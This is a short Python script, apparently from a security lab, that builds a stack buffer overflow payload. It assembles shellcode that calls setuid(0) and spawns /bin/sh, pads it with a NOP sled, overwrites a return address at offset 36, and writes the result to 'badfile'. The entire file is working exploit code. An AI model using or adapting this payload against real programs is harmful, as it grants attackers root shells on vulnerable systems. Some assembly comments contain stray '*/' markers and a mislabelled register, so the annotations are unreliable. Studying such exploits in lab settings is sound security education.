import sys

shellcode= (
	"\x31\xc0"	# xorl  %eax, %eax	
	"\x31\xdb"	# xorl  %ebx, %ebx	
	"\xb0\xd5"	# movb	 $0xd5, %ebx	*/
	"\xcd\x80"	# int   $0x80		*/
	"\x31\xc0"	# xorl  %eax, %eax	*/
	"\x50"		# pushl %eax		*/
	"\x68""//sh"	# pushl $0x68732f2f	*/
	"\x68""/bin"	# pushl $0x6e69622f	*/
	"\x89\xe3"	# movl	 %esp, %ebx	*/
	"\x50"		# pushl %eax		*/
	"\x53"		# pushl %ebx		*/
	"\x89\xe1"	# movl  %esp, %ecx	*/
	"\x99"		# cdq			*/
	"\xb0\x0b"	# movb	 $0x0b, %al	*/
	"\xcd\x80"	# int 	 $0x80		*/
).encode('latin-1')

content = bytearray(0x90 for i in range(517))

D = 36

content[D + 0] = 0x90
content[D + 1] = 0xeb
content[D + 2] = 0xff
content[D + 3] = 0xbf

start = 517 - len(shellcode)
content[start:] = shellcode

file = open("badfile", "wb")
file.write(content)
file.close()